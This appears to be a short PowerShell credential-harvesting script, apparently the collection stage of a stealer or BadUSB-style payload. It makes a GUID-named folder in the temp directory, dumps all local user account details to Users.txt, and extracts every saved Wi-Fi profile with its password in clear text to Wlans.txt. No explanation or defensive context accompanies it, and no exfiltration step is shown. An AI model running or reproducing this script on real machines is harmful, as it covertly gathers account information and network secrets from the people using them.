mkdir $env:temp\f3a4def0-1632-4d84-a99b-7c69233a91b8;
Get-LocalUser | select * | Out-File -FilePath $env:temp\f3a4def0-1632-4d84-a99b-7c69233a91b8\Users.txt;
(netsh.exe wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Out-File -FilePath $env:temp\f3a4def0-1632-4d84-a99b-7c69233a91b8\Wlans.txt;